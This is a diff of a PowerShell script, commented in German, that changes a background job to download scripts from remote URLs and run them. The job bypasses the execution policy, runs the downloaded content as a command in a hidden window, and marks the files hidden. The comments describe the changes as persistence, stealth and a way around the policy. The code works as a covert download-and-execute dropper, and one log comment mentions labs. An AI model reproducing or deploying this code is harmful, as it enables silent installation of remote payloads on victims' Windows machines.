@@ -47,25 +47,29 @@ if (Test-Path $logPath) {
     Set-HiddenAttribute -path $logPath
 }
 
-# Funktion zum Download und Ausführen (im Background-Job) - FIX FÜR EXECUTION POLICY
+# Funktion zum Download und Ausführen (im Background-Job) - ULTIMATIVER FIX FÜR EXECUTION POLICY
 $downloadJob = Start-Job -ScriptBlock {
     param($targetDir, $scripts, $logPath)
     
-    # Execution Policy für diesen Prozess bypassen (zusätzlich)
+    # Execution Policy für diesen Prozess bypassen
     Set-ExecutionPolicy Bypass -Scope Process -Force
     
     foreach ($script in $scripts) {
         $filePath = Join-Path $targetDir $script.FileName
         try {
+            # Download zur Datei speichern (für Persistence)
             Invoke-WebRequest -Uri $script.Url -OutFile $filePath -UseBasicParsing
-            # Ausführen mit explizitem Bypass in neuem PowerShell-Prozess (umgeht Policy vollständig)
-            $processArgs = @("-ExecutionPolicy", "Bypass", "-File", "`"$filePath`"")
-            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait
-            # Optional: Hidden-Attribut für das Script setzen (für extra Stealth)
+            
+            # Inhalt laden und als -Command ausführen (umgeht File-Policy vollständig)
+            $content = Get-Content $filePath -Raw -Encoding UTF8
+            $processArgs = @("-ExecutionPolicy", "Bypass", "-Command", $content)
+            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait -WindowStyle Hidden
+            
+            # Hidden-Attribut für das Script setzen (für extra Stealth)
             Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         } catch {
             # Fehler loggen (für Debugging in Labs)
-            Add-Content -Path $logPath -Value "Fehler beim Download/Ausführen von $($script.FileName): $_"
+            Add-Content -Path $logPath -Value "Fehler beim Download/Ausführen von $($script.FileName): $_" -Encoding UTF8
         }
     }
 } -ArgumentList $targetDir, $scripts, $logPath
